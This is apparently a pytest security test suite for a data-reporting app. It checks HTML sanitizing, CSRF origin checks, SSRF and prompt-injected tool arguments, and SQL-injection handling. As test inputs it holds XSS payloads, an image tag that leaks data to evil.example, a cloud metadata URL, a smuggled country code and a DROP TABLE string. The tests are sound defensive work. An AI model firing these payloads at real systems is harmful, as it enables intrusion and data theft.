import pytest
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route
from starlette.testclient import TestClient

from app import db, tools
from app.models import check_countries, check_indicator
from app.security import OriginCheckMiddleware, clean_text, sanitize_html


# ---------- XSS ----------
@pytest.mark.parametrize("payload", [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '<a href="javascript:alert(1)">x</a>',
    '<svg onload=alert(1)>',
])
def test_sanitizer_removes_script_vectors(payload):
    out = sanitize_html(payload)
    assert "onerror" not in out and "<script" not in out and "javascript:" not in out and "onload" not in out


def test_sanitizer_blocks_images_used_for_data_exfiltration():
    assert "<img" not in sanitize_html('<p><img src="https://evil.example/?q=secret"></p>')


def test_sanitizer_keeps_safe_formatting_and_https_links():
    out = sanitize_html('<p><strong>ok</strong> <a href="https://data.worldbank.org">src</a></p>')
    assert "<strong>ok</strong>" in out and 'href="https://data.worldbank.org"' in out


# ---------- CSRF ----------
def _client():
    async def ok(request):
        return PlainTextResponse("ok")
    app = Starlette(routes=[Route("/api/x", ok, methods=["GET", "POST"])])
    return TestClient(OriginCheckMiddleware(app))


def test_csrf_foreign_origin_post_is_rejected(monkeypatch):
    monkeypatch.setenv("ALLOWED_ORIGINS", "http://localhost:8080")
    client = _client()
    assert client.post("/api/x", headers={"Origin": "https://evil.example"}).status_code == 403
    assert client.post("/api/x", headers={"Origin": "http://localhost:8080"}).status_code == 200
    assert client.get("/api/x", headers={"Origin": "https://evil.example"}).status_code == 200  # safe method


# ---------- SSRF / prompt-injected arguments ----------
@pytest.mark.parametrize("invalid_code", ["../../x", "http://169.254.169.254", "FP.CPI?url=http://evil", "A" * 50, ""])
def test_indicator_validation_blocks_url_injection(invalid_code):
    with pytest.raises(ValueError):
        check_indicator(invalid_code)


def test_country_validation():
    with pytest.raises(ValueError):
        check_countries(["POL;evil"])
    with pytest.raises(ValueError):
        check_countries([])
    assert check_countries(["pol", "POL", "ukr"]) == ["POL", "UKR"]


def test_tools_have_no_url_parameters():
    import inspect
    params = {parameter for tool_function in tools.ALL for parameter in inspect.signature(tool_function).parameters}
    assert not params & {"url", "uri", "endpoint", "host"}


# ---------- SQL injection ----------
def test_sql_injection_in_report_title_is_stored_as_text():
    ref = db.put_ref("scores", {"rows": []})
    title = "x'); DROP TABLE reports; --"
    saved = db.save_report(title, "s", [ref])
    assert db.get_report(saved["report_id"])["title"] == title
    assert db.list_reports()  # table still exists


def test_clean_text_strips_html_and_control_chars():
    assert clean_text("<b>hi</b>\x00 there", 50) == "hi there"
